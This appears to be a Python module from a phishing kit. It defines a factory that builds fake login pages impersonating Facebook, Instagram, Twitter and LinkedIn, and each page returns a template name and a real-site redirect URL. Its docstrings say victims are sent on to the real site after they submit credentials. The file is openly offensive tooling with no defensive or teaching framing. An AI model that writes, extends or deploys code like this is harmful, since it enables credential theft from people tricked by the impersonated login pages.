from abc import ABC, abstractmethod

class PhishingPage(ABC):
    """
    Abstract Base Class for a phishing page.
    This class is part of the Factory Method pattern.
    It declares the interface that all concrete phishing pages must implement.
    """
    @abstractmethod
    def get_template_name(self) -> str:
        """Returns the specific template name to render for this platform."""
        pass

    @abstractmethod
    def get_redirect_url(self) -> str:
        """Returns the URL where the victim will be redirected after submitting credentials."""
        pass
    
    @abstractmethod
    def get_platform_name(self) -> str:
        """Returns the internal name of the platform."""
        pass


class FacebookPhishingPage(PhishingPage):
    """Concrete Implementation for Facebook."""
    def get_template_name(self) -> str:
        return "login_facebook.html"
    
    def get_redirect_url(self) -> str:
        return "https://facebook.com"
    
    def get_platform_name(self) -> str:
        return "facebook"


class InstagramPhishingPage(PhishingPage):
    """Concrete Implementation for Instagram."""
    def get_template_name(self) -> str:
        return "login_instagram.html"
    
    def get_redirect_url(self) -> str:
        return "https://instagram.com"
    
    def get_platform_name(self) -> str:
        return "instagram"


class TwitterPhishingPage(PhishingPage):
    """Concrete Implementation for Twitter."""
    def get_template_name(self) -> str:
        return "login_twitter.html"
    
    def get_redirect_url(self) -> str:
        return "https://twitter.com"
    
    def get_platform_name(self) -> str:
        return "twitter"


class LinkedInPhishingPage(PhishingPage):
    """Concrete Implementation for LinkedIn."""
    def get_template_name(self) -> str:
        return "login_linkedin.html"
    
    def get_redirect_url(self) -> str:
        return "https://linkedin.com"
    
    def get_platform_name(self) -> str:
        return "linkedin"


class PhishingPageFactory:
    """
    Creator class for the Factory Method pattern.
    It encapsulates the logic of instantiating the correct PhishingPage based on a string.
    """
    # Internal registry mapped to platform string
    _registry = {
        "facebook": FacebookPhishingPage,
        "instagram": InstagramPhishingPage,
        "twitter": TwitterPhishingPage,
        "linkedin": LinkedInPhishingPage
    }

    @staticmethod
    def create(platform_name: str) -> PhishingPage:
        """
        Creates and returns a concrete PhishingPage instance.
        
        Args:
            platform_name (str): The requested platform.
            
        Returns:
            PhishingPage: An instance of the requested platform page.
            
        Raises:
            ValueError: If the platform is not in the internal registry.
        """
        platform_name = platform_name.lower().strip()
        page_class = PhishingPageFactory._registry.get(platform_name)
        
        if not page_class:
            valid_options = ", ".join(PhishingPageFactory._registry.keys())
            raise ValueError(f"Invalid platform '{platform_name}'. Valid options are: {valid_options}")
            
        return page_class()
